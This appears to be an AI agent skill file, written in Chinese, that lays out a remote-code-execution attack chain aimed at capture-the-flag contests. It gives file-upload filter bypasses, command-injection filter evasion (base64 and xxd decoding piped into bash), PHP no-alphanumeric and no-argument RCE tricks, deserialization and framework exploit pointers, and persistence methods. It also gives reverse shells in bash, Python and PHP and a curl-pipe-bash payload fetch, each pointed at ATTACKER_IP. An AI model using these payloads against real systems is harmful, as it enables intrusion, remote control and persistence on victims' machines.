---
name: rce-attack-chain
description: Use when encountering rce攻击思维链 - 文件上传、命令注入、反序列化、框架漏洞
---

# 远程代码执行攻击链

## Info

- **Domain**: web
- **Tags**: web, rce

# RCE攻击思维链

```
入口点识别 → 文件上传/命令注入/反序列化/框架漏洞
       ↓
获取执行 → WebShell/反弹连接/内存马
       ↓
权限维持 → 定时任务/后门用户/SSH公钥
```

---

## 文件上传

**绕过思路**:
| 防护 | 绕过方法 |
|------|----------|
| 后缀黑名单 | php5/phtml/phps/php7等变种 |
| Content-Type | 改为 image/jpeg |
| 文件头检测 | 添加GIF89a/PNG头 |
| 二次渲染 | 配合条件竞争 |
| 路径可控 | 00截断/上传.htaccess |

**关键技术**:
- 图片马: 合并图片和PHP代码
- .htaccess: 让jpg当php执行
- 条件竞争: 上传→快速访问→执行

---

## 命令注入

**连接符**: `;` `|` `||` `&` `&&` 换行符 反引号 `$()`

**无回显利用**:
- 反向连接: 使用bash/python/perl等
- DNS外带: 通过子域名带出数据
- HTTP外带: 通过请求带出数据

**绕过空格**: `$IFS` `${IFS}` 重定向符号 `<` `${IFS}$9`

**绕过关键字**:
- 变量拼接: `a=f&&b=lag&&cat $a$b`
- 编码绕过(Base64/Hex): `echo "Y2F0IGZsYWc="| base64 -d | bash`
- 通配符替代: `cat f*` `cat f???` `cat fla[f-h]`
- 引号分割: `cat'' fl''ag` `ca\t fl\ag`
- `$@` 分割: `cat$@t fl$@ag`
- 八进制: `cat $'\146\154\141\147'`
- xxd 十六进制: `echo "63617420666c6167" | xxd -r -p | bash`
- `/` 绕过: `echo ${PATH:0:1}` 获取 `/`

**无数字字母 RCE（PHP）**:
```php
// 自增法（PHP < 8.3）
$_=[]._;$_=$_[_];$_++; // A->B->C...
// 构造 payload: _$__(POST[_])  → system('cat /f*')
```

**无参数 RCE（PHP）**:
```php
// 列目录
scandir(current(localeconv()))
var_dump(scandir(dirname(getcwd())))  // 上级目录

// 读文件
highlight_file(array_rand(array_flip(scandir(getcwd()))))

// Header 注入
end(getallheaders())

// Session ID 执行
eval(hex2bin(session_id(session_start())))

// 变量定义
get_defined_vars()  // 获取最后一个变量
```

**无回显 RCE**:
```bash
# tee 写入文件
ls / | tee 1.txt
# cp 复制
cp /flag .
cp /f* /dev/stdout
```

**PHP 编码绕过**:
```php
// 十六进制
("\x70\x68\x70\x69\x6e\x66\x6f")();  // phpinfo()

// 八进制
"\163\171\163\164\145\155"('id');    // system('id')

// Unicode
"\u{73}\u{79}\u{73}\u{74}\u{65}\u{6d}"('id');
```

---

## 反序列化RCE

### PHP
- **魔术方法链**: `__destruct/__wakeup/__toString/__get`
- **Phar反序列化**: 通过file_exists等触发
- **原生类**: SoapClient(SSRF)/DirectoryIterator/SplFileObject

### Java
- **工具**: ysoserial生成payload
- **常见链**: CommonsCollections/CommonsBeanutils/Spring
- **入口**: ObjectInputStream/JRMP

### Python
- **Pickle**: `__reduce__`方法
- **绕过**: 黑名单模块替代

---

## 框架漏洞RCE

| 框架 | 漏洞 | 利用方式 |
|------|------|---------|
| Log4j | JNDI注入 | jndi:ldap协议 |
| Spring | SpEL | 表达式执行 |
| Fastjson | 反序列化 | JdbcRowSetImpl |
| Shiro | RememberMe | 反序列化链 |
| Struts2 | OGNL | OGNL表达式 |
| ThinkPHP | RCE | invokefunction |

---

## 反向连接方式

### 检测方法
```bash
whereis nc bash python php exec lua perl ruby
# 确定目标支持的反弹方法
```

### Bash 反弹（最常用）
```bash
# 攻击者监听
nc -lvp 9999

# 受害者执行
bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
```

### Python 反弹
```bash
# 攻击者监听
nc -lvp 7777

# 受害者执行
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```

### PHP 反弹
```bash
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### curl 下载执行
```bash
curl http://ATTACKER_IP/shell.sh | bash
```

### NC 参数说明
- `-l` 监听模式，用于入站连接
- `-v` 详细输出（两个-v更详细）
- `-p port` 本地端口号

### NAT/防火墙绕过

| 障碍 | 解决方案 |
|------|----------|
| NAT | 端口转发 / 中转服务器 / frp |
| 防火墙 | 使用中转服务器（VPS监听） |

**推荐方案（比赛环境）**:
```bash
# Kali 上监听
nc -lvp 4444
# 目标反弹到 Kali IP:4444
```

**注意**: 比赛环境通常不能出网，反弹 shell 到本地 Kali 即可。

---

## 内存马

| 语言 | 类型 |
|------|------|
| PHP | 不死马(进程循环生成) |
| Java | Filter/Servlet/Valve |
| Spring | Controller内存马 |